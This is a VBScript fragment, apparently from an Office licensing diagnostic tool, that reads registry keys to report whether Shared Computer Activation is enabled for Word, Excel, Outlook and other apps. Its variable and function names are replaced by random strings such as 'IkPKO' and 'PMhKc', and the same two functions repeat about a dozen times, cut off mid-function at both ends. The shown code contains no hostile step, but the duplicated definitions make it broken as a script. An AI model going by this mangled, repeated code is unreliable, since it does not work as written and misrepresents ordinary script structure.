        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function





'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

